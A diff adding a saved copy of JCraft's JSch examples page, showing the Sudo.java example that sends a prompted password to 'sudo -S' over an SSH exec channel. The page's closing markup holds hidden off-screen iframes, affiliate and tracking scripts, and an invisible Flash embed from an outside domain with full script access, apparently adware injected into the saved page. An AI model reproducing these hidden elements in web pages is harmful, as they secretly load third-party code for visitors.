id="file-sudo-java-LC36">&nbsp;</div><div class="line" id="file-sudo-java-LC37">      <span class="n">String</span> <span class="n">sudo_pass</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC38">      <span class="o">{</span></div><div class="line" id="file-sudo-java-LC39">        <span class="n">JTextField</span> <span class="n">passwordField</span><span class="o">=(</span><span class="n">JTextField</span><span class="o">)</span><span class="k">new</span> <span class="nf">JPasswordField</span><span class="o">(</span><span class="mi">8</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC40">        <span class="n">Object</span><span class="o">[]</span> <span class="n">ob</span><span class="o">={</span><span class="n">passwordField</span><span class="o">};</span> </div><div class="line" id="file-sudo-java-LC41">        <span class="kt">int</span> <span class="n">result</span><span class="o">=</span></div><div class="line" id="file-sudo-java-LC42">          <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showConfirmDialog</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> </div><div class="line" id="file-sudo-java-LC43">                                        <span class="n">ob</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC44">                                        <span class="s">"Enter password for sudo"</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC45">                                        <span class="n">JOptionPane</span><span class="o">.</span><span class="na">OK_CANCEL_OPTION</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC46">        <span class="k">if</span><span class="o">(</span><span class="n">result</span><span class="o">!=</span><span class="n">JOptionPane</span><span class="o">.</span><span class="na">OK_OPTION</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC47">          <span class="n">System</span><span class="o">.</span><span class="na">exit</span><span class="o">(-</span><span class="mi">1</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC48">        <span class="o">}</span>  </div><div class="line" id="file-sudo-java-LC49">        <span class="n">sudo_pass</span><span class="o">=</span><span class="n">passwordField</span><span class="o">.</span><span class="na">getText</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC50">      <span class="o">}</span></div><div class="line" id="file-sudo-java-LC51">&nbsp;</div><div class="line" id="file-sudo-java-LC52">      <span class="n">Channel</span> <span class="n">channel</span><span class="o">=</span><span class="n">session</span><span class="o">.</span><span class="na">openChannel</span><span class="o">(</span><span class="s">"exec"</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC53">   </div><div class="line" id="file-sudo-java-LC54">      <span class="c1">// man sudo</span></div><div class="line" id="file-sudo-java-LC55">      <span class="c1">//   -S  The -S (stdin) option causes sudo to read the password from the</span></div><div class="line" id="file-sudo-java-LC56">      <span class="c1">//       standard input instead of the terminal device.</span></div><div class="line" id="file-sudo-java-LC57">      <span class="c1">//   -p  The -p (prompt) option allows you to override the default</span></div><div class="line" id="file-sudo-java-LC58">      <span class="c1">//       password prompt and use a custom one.</span></div><div class="line" id="file-sudo-java-LC59">      <span class="o">((</span><span class="n">ChannelExec</span><span class="o">)</span><span class="n">channel</span><span class="o">).</span><span class="na">setCommand</span><span class="o">(</span><span class="s">"sudo -S -p '' "</span><span class="o">+</span><span class="n">command</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC60">&nbsp;</div><div class="line" id="file-sudo-java-LC61">&nbsp;</div><div class="line" id="file-sudo-java-LC62">      <span class="n">InputStream</span> <span class="n">in</span><span class="o">=</span><span class="n">channel</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC63">      <span class="n">OutputStream</span> <span class="n">out</span><span class="o">=</span><span class="n">channel</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC64">      <span class="o">((</span><span class="n">ChannelExec</span><span class="o">)</span><span class="n">channel</span><span class="o">).</span><span class="na">setErrStream</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC65">&nbsp;</div><div class="line" id="file-sudo-java-LC66">      <span class="n">channel</span><span class="o">.</span><span class="na">connect</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC67">&nbsp;</div><div class="line" id="file-sudo-java-LC68">      <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">((</span><span class="n">sudo_pass</span><span class="o">+</span><span class="s">"\n"</span><span class="o">).</span><span class="na">getBytes</span><span class="o">());</span></div><div class="line" id="file-sudo-java-LC69">      <span class="n">out</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC70">&nbsp;</div><div class="line" id="file-sudo-java-LC71">      <span class="kt">byte</span><span class="o">[]</span> <span class="n">tmp</span><span class="o">=</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">1024</span><span class="o">];</span></div><div class="line" id="file-sudo-java-LC72">      <span class="k">while</span><span class="o">(</span><span class="kc">true</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC73">        <span class="k">while</span><span class="o">(</span><span class="n">in</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC74">          <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="n">in</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">tmp</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">1024</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC75">          <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">)</span><span class="k">break</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC76">          <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">tmp</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">i</span><span class="o">));</span></div><div class="line" id="file-sudo-java-LC77">        <span class="o">}</span></div><div class="line" id="file-sudo-java-LC78">        <span class="k">if</span><span class="o">(</span><span class="n">channel</span><span class="o">.</span><span class="na">isClosed</span><span class="o">()){</span></div><div class="line" id="file-sudo-java-LC79">          <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"exit-status: "</span><span class="o">+</span><span class="n">channel</span><span class="o">.</span><span class="na">getExitStatus</span><span class="o">());</span></div><div class="line" id="file-sudo-java-LC80">          <span class="k">break</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC81">        <span class="o">}</span></div><div class="line" id="file-sudo-java-LC82">        <span class="k">try</span><span class="o">{</span><span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">1000</span><span class="o">);}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">ee</span><span class="o">){}</span></div><div class="line" id="file-sudo-java-LC83">      <span class="o">}</span></div><div class="line" id="file-sudo-java-LC84">      <span class="n">channel</span><span class="o">.</span><span class="na">disconnect</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC85">      <span class="n">session</span><span class="o">.</span><span class="na">disconnect</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC86">    <span class="o">}</span></div><div class="line" id="file-sudo-java-LC87">    <span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC88">      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC89">    <span class="o">}</span></div><div class="line" id="file-sudo-java-LC90">  <span class="o">}</span></div><div class="line" id="file-sudo-java-LC91">&nbsp;</div><div class="line" id="file-sudo-java-LC92">  <span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">MyUserInfo</span> <span class="kd">implements</span> <span class="n">UserInfo</span><span class="o">,</span> <span class="n">UIKeyboardInteractive</span><span class="o">{</span></div><div class="line" id="file-sudo-java-LC93">    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getPassword</span><span class="o">(){</span> <span class="k">return</span> <span class="n">passwd</span><span class="o">;</span> <span class="o">}</span></div><div class="line" id="file-sudo-java-LC94">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">promptYesNo</span><span class="o">(</span><span class="n">String</span> <span class="n">str</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC95">      <span class="n">Object</span><span class="o">[]</span> <span class="n">options</span><span class="o">={</span> <span class="s">"yes"</span><span class="o">,</span> <span class="s">"no"</span> <span class="o">};</span></div><div class="line" id="file-sudo-java-LC96">      <span class="kt">int</span> <span class="n">foo</span><span class="o">=</span><span class="n">JOptionPane</span><span class="o">.</span><span class="na">showOptionDialog</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> </div><div class="line" id="file-sudo-java-LC97">             <span class="n">str</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC98">             <span class="s">"Warning"</span><span class="o">,</span> </div><div class="line" id="file-sudo-java-LC99">             <span class="n">JOptionPane</span><span class="o">.</span><span class="na">DEFAULT_OPTION</span><span class="o">,</span> </div><div class="line" id="file-sudo-java-LC100">             <span class="n">JOptionPane</span><span class="o">.</span><span class="na">WARNING_MESSAGE</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC101">             <span class="kc">null</span><span class="o">,</span> <span class="n">options</span><span class="o">,</span> <span class="n">options</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span></div><div class="line" id="file-sudo-java-LC102">       <span class="k">return</span> <span class="n">foo</span><span class="o">==</span><span class="mi">0</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC103">    <span class="o">}</span></div><div class="line" id="file-sudo-java-LC104">  </div><div class="line" id="file-sudo-java-LC105">    <span class="n">String</span> <span class="n">passwd</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC106">    <span class="n">JTextField</span> <span class="n">passwordField</span><span class="o">=(</span><span class="n">JTextField</span><span class="o">)</span><span class="k">new</span> <span class="nf">JPasswordField</span><span class="o">(</span><span class="mi">20</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC107">&nbsp;</div><div class="line" id="file-sudo-java-LC108">    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getPassphrase</span><span class="o">(){</span> <span class="k">return</span> <span class="kc">null</span><span class="o">;</span> <span class="o">}</span></div><div class="line" id="file-sudo-java-LC109">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">promptPassphrase</span><span class="o">(</span><span class="n">String</span> <span class="n">message</span><span class="o">){</span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span> <span class="o">}</span></div><div class="line" id="file-sudo-java-LC110">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">promptPassword</span><span class="o">(</span><span class="n">String</span> <span class="n">message</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC111">      <span class="n">Object</span><span class="o">[]</span> <span class="n">ob</span><span class="o">={</span><span class="n">passwordField</span><span class="o">};</span> </div><div class="line" id="file-sudo-java-LC112">      <span class="kt">int</span> <span class="n">result</span><span class="o">=</span></div><div class="line" id="file-sudo-java-LC113">        <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showConfirmDialog</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">ob</span><span class="o">,</span> <span class="n">message</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC114">                                      <span class="n">JOptionPane</span><span class="o">.</span><span class="na">OK_CANCEL_OPTION</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC115">      <span class="k">if</span><span class="o">(</span><span class="n">result</span><span class="o">==</span><span class="n">JOptionPane</span><span class="o">.</span><span class="na">OK_OPTION</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC116">        <span class="n">passwd</span><span class="o">=</span><span class="n">passwordField</span><span class="o">.</span><span class="na">getText</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC117">        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC118">      <span class="o">}</span></div><div class="line" id="file-sudo-java-LC119">      <span class="k">else</span><span class="o">{</span> </div><div class="line" id="file-sudo-java-LC120">        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span> </div><div class="line" id="file-sudo-java-LC121">      <span class="o">}</span></div><div class="line" id="file-sudo-java-LC122">    <span class="o">}</span></div><div class="line" id="file-sudo-java-LC123">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">showMessage</span><span class="o">(</span><span class="n">String</span> <span class="n">message</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC124">      <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">message</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC125">    <span class="o">}</span></div><div class="line" id="file-sudo-java-LC126">    <span class="kd">final</span> <span class="n">GridBagConstraints</span> <span class="n">gbc</span> <span class="o">=</span> </div><div class="line" id="file-sudo-java-LC127">      <span class="k">new</span> <span class="nf">GridBagConstraints</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="mi">1</span><span class="o">,</span><span class="mi">1</span><span class="o">,</span><span class="mi">1</span><span class="o">,</span><span class="mi">1</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC128">                             <span class="n">GridBagConstraints</span><span class="o">.</span><span class="na">NORTHWEST</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC129">                             <span class="n">GridBagConstraints</span><span class="o">.</span><span class="na">NONE</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC130">                             <span class="k">new</span> <span class="nf">Insets</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="mi">0</span><span class="o">),</span><span class="mi">0</span><span class="o">,</span><span class="mi">0</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC131">    <span class="kd">private</span> <span class="n">Container</span> <span class="n">panel</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC132">    <span class="kd">public</span> <span class="n">String</span><span class="o">[]</span> <span class="nf">promptKeyboardInteractive</span><span class="o">(</span><span class="n">String</span> <span class="n">destination</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC133">                                              <span class="n">String</span> <span class="n">name</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC134">                                              <span class="n">String</span> <span class="n">instruction</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC135">                                              <span class="n">String</span><span class="o">[]</span> <span class="n">prompt</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC136">                                              <span class="kt">boolean</span><span class="o">[]</span> <span class="n">echo</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC137">      <span class="n">panel</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">JPanel</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC138">      <span class="n">panel</span><span class="o">.</span><span class="na">setLayout</span><span class="o">(</span><span class="k">new</span> <span class="nf">GridBagLayout</span><span class="o">());</span></div><div class="line" id="file-sudo-java-LC139">&nbsp;</div><div class="line" id="file-sudo-java-LC140">      <span class="n">gbc</span><span class="o">.</span><span class="na">weightx</span> <span class="o">=</span> <span class="mf">1.0</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC141">      <span class="n">gbc</span><span class="o">.</span><span class="na">gridwidth</span> <span class="o">=</span> <span class="n">GridBagConstraints</span><span class="o">.</span><span class="na">REMAINDER</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC142">      <span class="n">gbc</span><span class="o">.</span><span class="na">gridx</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC143">      <span class="n">panel</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nf">JLabel</span><span class="o">(</span><span class="n">instruction</span><span class="o">),</span> <span class="n">gbc</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC144">      <span class="n">gbc</span><span class="o">.</span><span class="na">gridy</span><span class="o">++;</span></div><div class="line" id="file-sudo-java-LC145">&nbsp;</div><div class="line" id="file-sudo-java-LC146">      <span class="n">gbc</span><span class="o">.</span><span class="na">gridwidth</span> <span class="o">=</span> <span class="n">GridBagConstraints</span><span class="o">.</span><span class="na">RELATIVE</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC147">&nbsp;</div><div class="line" id="file-sudo-java-LC148">      <span class="n">JTextField</span><span class="o">[]</span> <span class="n">texts</span><span class="o">=</span><span class="k">new</span> <span class="n">JTextField</span><span class="o">[</span><span class="n">prompt</span><span class="o">.</span><span class="na">length</span><span class="o">];</span></div><div class="line" id="file-sudo-java-LC149">      <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">prompt</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++){</span></div><div class="line" id="file-sudo-java-LC150">        <span class="n">gbc</span><span class="o">.</span><span class="na">fill</span> <span class="o">=</span> <span class="n">GridBagConstraints</span><span class="o">.</span><span class="na">NONE</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC151">        <span class="n">gbc</span><span class="o">.</span><span class="na">gridx</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC152">        <span class="n">gbc</span><span class="o">.</span><span class="na">weightx</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC153">        <span class="n">panel</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nf">JLabel</span><span class="o">(</span><span class="n">prompt</span><span class="o">[</span><span class="n">i</span><span class="o">]),</span><span class="n">gbc</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC154">&nbsp;</div><div class="line" id="file-sudo-java-LC155">        <span class="n">gbc</span><span class="o">.</span><span class="na">gridx</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC156">        <span class="n">gbc</span><span class="o">.</span><span class="na">fill</span> <span class="o">=</span> <span class="n">GridBagConstraints</span><span class="o">.</span><span class="na">HORIZONTAL</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC157">        <span class="n">gbc</span><span class="o">.</span><span class="na">weighty</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC158">        <span class="k">if</span><span class="o">(</span><span class="n">echo</span><span class="o">[</span><span class="n">i</span><span class="o">]){</span></div><div class="line" id="file-sudo-java-LC159">          <span class="n">texts</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="k">new</span> <span class="nf">JTextField</span><span class="o">(</span><span class="mi">20</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC160">        <span class="o">}</span></div><div class="line" id="file-sudo-java-LC161">        <span class="k">else</span><span class="o">{</span></div><div class="line" id="file-sudo-java-LC162">          <span class="n">texts</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="k">new</span> <span class="nf">JPasswordField</span><span class="o">(</span><span class="mi">20</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC163">        <span class="o">}</span></div><div class="line" id="file-sudo-java-LC164">        <span class="n">panel</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">texts</span><span class="o">[</span><span class="n">i</span><span class="o">],</span> <span class="n">gbc</span><span class="o">);</span></div><div class="line" id="file-sudo-java-LC165">        <span class="n">gbc</span><span class="o">.</span><span class="na">gridy</span><span class="o">++;</span></div><div class="line" id="file-sudo-java-LC166">      <span class="o">}</span></div><div class="line" id="file-sudo-java-LC167">&nbsp;</div><div class="line" id="file-sudo-java-LC168">      <span class="k">if</span><span class="o">(</span><span class="n">JOptionPane</span><span class="o">.</span><span class="na">showConfirmDialog</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">panel</span><span class="o">,</span> </div><div class="line" id="file-sudo-java-LC169">                                       <span class="n">destination</span><span class="o">+</span><span class="s">": "</span><span class="o">+</span><span class="n">name</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC170">                                       <span class="n">JOptionPane</span><span class="o">.</span><span class="na">OK_CANCEL_OPTION</span><span class="o">,</span></div><div class="line" id="file-sudo-java-LC171">                                       <span class="n">JOptionPane</span><span class="o">.</span><span class="na">QUESTION_MESSAGE</span><span class="o">)</span></div><div class="line" id="file-sudo-java-LC172">         <span class="o">==</span><span class="n">JOptionPane</span><span class="o">.</span><span class="na">OK_OPTION</span><span class="o">){</span></div><div class="line" id="file-sudo-java-LC173">        <span class="n">String</span><span class="o">[]</span> <span class="n">response</span><span class="o">=</span><span class="k">new</span> <span class="n">String</span><span class="o">[</span><span class="n">prompt</span><span class="o">.</span><span class="na">length</span><span class="o">];</span></div><div class="line" id="file-sudo-java-LC174">        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">prompt</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++){</span></div><div class="line" id="file-sudo-java-LC175">          <span class="n">response</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">texts</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getText</span><span class="o">();</span></div><div class="line" id="file-sudo-java-LC176">        <span class="o">}</span></div><div class="line" id="file-sudo-java-LC177">	<span class="k">return</span> <span class="n">response</span><span class="o">;</span></div><div class="line" id="file-sudo-java-LC178">      <span class="o">}</span></div><div class="line" id="file-sudo-java-LC179">      <span class="k">else</span><span class="o">{</span></div><div class="line" id="file-sudo-java-LC180">        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>  <span class="c1">// cancel</span></div><div class="line" id="file-sudo-java-LC181">      <span class="o">}</span></div><div class="line" id="file-sudo-java-LC182">    <span class="o">}</span></div><div class="line" id="file-sudo-java-LC183">  <span class="o">}</span></div><div class="line" id="file-sudo-java-LC184"><span class="o">}</span></div></pre>
+          </td>
+        </tr>
+      </tbody></table>
+    </div>
+
+          </div>
+          <div class="gist-meta">
+            <a href="https://gist.github.com/ymnk/2318108/raw/Sudo.java" style="float:right">view raw</a>
+            <a href="https://gist.github.com/ymnk/2318108#file-sudo-java">Sudo.java</a>
+            hosted with &#10084; by <a href="https://github.com/">GitHub</a>
+          </div>
+        </div>
+</div>
+
+           <p></p>
+
+        </div><!-- end of right -->
+
+        <div class="fix">
+          <img src="./JSch - Java Secure Channel - Examples_files/sp.gif" width="1" height="1" alt="">
+        </div>
+
+      </div><!-- end of content -->
+
+      <div id="footer">
+        <div class="footer">
+          <div class="cp1">
+            &nbsp;
+            Copyright 1998-2012 JCraft, Inc. All rights reserved. &nbsp;
+            | &nbsp; Send comments and questions to 
+            <a href="mailto:info@jcraft.com">info@jcraft.com</a>.
+          </div>
+          <div class="cp2">
+            <a href="http://jigsaw.w3.org/css-validator/validator?uri=http%3A%2F%2Fwww.jcraft.com%2Fcss%2Fstyle.css&profile=css21&usermedium=all&warning=1">CSS</a> 
+            &nbsp; | &nbsp; 
+            <a href="http://validator.w3.org/check?uri=referer">XHTML 1.1</a> 
+            &nbsp;
+          </div>
+        </div>
+      </div><!-- end of footer -->
+
+    </div><!-- end of mail -->
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script><script src="./JSch - Java Secure Channel - Examples_files/ga.js" type="text/javascript"></script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-2855901-4");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+  
+
+<script type="text/javascript" async="" src="./JSch - Java Secure Channel - Examples_files/cnzz.js"></script><script type="text/javascript">var vglnk = {api_url: '//api.viglink.com/api', key: '084c74521c465af0d8f08b63422103cc'};</script><script type="text/javascript" async="" src="./JSch - Java Secure Channel - Examples_files/vglnk.js"></script><iframe src="./JSch - Java Secure Channel - Examples_files/userData.html" style="position: absolute; top: -100px; left: -100px; z-index: -10; border: none; visibility: hidden; width: 1px; height: 1px;"></iframe><iframe src="./JSch - Java Secure Channel - Examples_files/register_server_layer.html" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;"></iframe><iframe style="position: absolute; width: 1px; height: 1px; top: 0px; left: 0px; visibility: hidden;"></iframe><div id="dp_swf_engine" style="position: absolute; width: 1px; height: 1px;"><embed style="width: 1px; height: 1px;" type="application/x-shockwave-flash" src="http://www.ajaxcdn.org/swf.swf" width="1" height="1" id="_dp_swf_engine" name="_dp_swf_engine" bgcolor="#336699" quality="high" allowscriptaccess="always"></div><sfmsg id="sfMsgId" data="{&quot;imageCount&quot;:0,&quot;ip&quot;:&quot;1.1.1.1&quot;}"></sfmsg></body></html>
